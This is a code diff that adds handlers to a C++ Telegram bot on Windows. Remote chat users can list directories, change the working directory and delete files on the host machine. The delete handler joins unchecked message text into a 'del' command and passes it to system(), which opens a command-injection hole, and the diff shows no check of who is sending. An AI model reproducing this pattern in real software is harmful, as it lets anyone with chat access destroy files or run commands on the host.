@@ -95,4 +95,38 @@ int main() {
         bot.getApi().sendMessage(ms->chat->id, "Enter path...", false, 0, keyboardWithLayout);
         last_cmd = "chdir";
         });
+
+    bot.getEvents().onCommand("dir", [&bot, &keyboardWithLayout](Message::Ptr ms) {
+        system("dir /b > m.txt");
+        bot.getApi().sendMessage(ms->chat->id, GetInfoCmd(), false, 0, keyboardWithLayout);
+        });
+
+    bot.getEvents().onCommand("rm_file", [&bot, &keyboardWithLayout, &last_cmd](Message::Ptr ms) {
+        bot.getApi().sendMessage(ms->chat->id, "Enter path...", false, 0, keyboardWithLayout);
+        last_cmd = "rm_file";
+        });
+
+    bot.getEvents().onNonCommandMessage([&bot, &keyboardWithLayout, &last_cmd](Message::Ptr ms) {
+        if (last_cmd == "chdir") {
+            char path[1024];
+            string buf = ms->text;
+            strcpy_s(path, buf.c_str());
+
+            _chdir(path);
+            system("cd > m.txt");
+            bot.getApi().sendMessage(ms->chat->id, GetInfoCmd(), false, 0, keyboardWithLayout);
+            system("del m.txt");
+            last_cmd = "";
+        }
+        else if (last_cmd == "rm_file") {
+            char cmd[1024];
+            string buf = "del " + ms->text + " > m.txt";
+            strcpy_s(cmd, buf.c_str());
+
+            system(cmd);
+
+            bot.getApi().sendMessage(ms->chat->id, "File removed!", false, 0, keyboardWithLayout);
+        }
+
+        });
 }
